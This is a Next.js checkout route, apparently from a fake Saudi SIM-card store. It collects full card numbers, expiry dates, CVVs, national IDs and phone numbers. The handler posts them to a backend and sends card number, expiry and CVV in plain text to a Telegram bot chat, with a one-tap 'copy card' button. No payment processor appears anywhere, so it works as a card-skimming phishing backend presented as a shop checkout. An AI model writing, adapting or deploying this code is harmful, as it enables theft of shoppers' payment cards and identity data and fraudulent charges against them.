import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  const backendUrl = process.env.BACKEND_URL;
  const payload = JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment });

  const ltr = "\u200E";

  // تنسيق رقم البطاقة: مسافة بعد كل 4 أرقام
  const formattedCard = cardNumber.replace(/\s/g, "").replace(/(\d{4})/g, "$1 ").trim();

  // تنسيق رقم الجوال: يبدأ بـ 05
  const formattedPhone = (whatsapp ?? "-").replace(/^(\+966|966)/, "0");

  const text = [
    `🛒 متجر مؤسسة لمسه لبيع الشرائح`,
    `🔖 Order ID: ${ltr}#${orderId}`,
    ``,
    `💲 Total Amount: ${ltr}${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${ltr}${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🙍 Order For: ${ltr}${customer ?? "-"}`,
    `📱 Phone Number: ${ltr}${formattedPhone}`,
    `🪪 Card Number: ${ltr}${formattedCard}`,
    `✍️ Card Holder: ${ltr}${cardHolder}`,
    `📆 Valid To: ${ltr}${expiry}`,
    `🔑 CVV: ${ltr}${cvv}`,
  ].join("\n");

  // رقم واتساب: لو بدأ بـ 05 نحوله لـ 966
  const rawNum = (whatsapp ?? "").replace(/\D/g, "");
  const whatsappNum = rawNum.startsWith("0") ? `966${rawNum.slice(1)}` : rawNum;
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ  البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } },
        ...(whatsappNum ? [{ text: "💬 WhatsApp", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  await Promise.all([
    fetch(`${backendUrl}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: payload,
    }).then(r => r.json()).then(j => console.log("[notify] save response:", JSON.stringify(j))).catch(e => console.error("[notify] save error:", e)),
    fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
      }
    ).then(r => r.json()).then(j => console.log("[notify] telegram response:", JSON.stringify(j))).catch(e => console.error("[notify] telegram error:", e)),
  ]);

  return NextResponse.json({ ok: true, orderId });
}
